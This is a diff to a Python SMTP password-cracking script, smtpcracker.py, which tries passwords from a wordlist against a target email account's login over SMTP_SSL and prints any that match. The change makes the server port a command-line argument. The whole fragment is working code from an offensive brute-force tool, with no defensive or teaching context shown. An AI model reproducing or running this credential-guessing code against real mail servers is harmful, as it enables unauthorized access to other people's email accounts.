@@ -1,5 +1,5 @@
 #By s0ck37
-#Args: python3 smtpcracker.py wordlist.txt emailtocrack@domain.com smtp.example.server
+#Args: python3 smtpcracker.py wordlist.txt emailtocrack@domain.com smtp.example.server port
 
 import smtplib,sys,threading
 from colorama import Fore,Style,Back
@@ -16,7 +16,7 @@ def main():
     dict.close()
 
 def try_login(usr,pwd):
-    server = smtplib.SMTP_SSL(sys.argv[3],465)
+    server = smtplib.SMTP_SSL(sys.argv[3],int(sys.argv[4]))
     try:
         server.login(usr,pwd)
         print(Fore.BLUE + "[+] Password matched: "+ Fore.RED + pwd+ Fore.RESET)
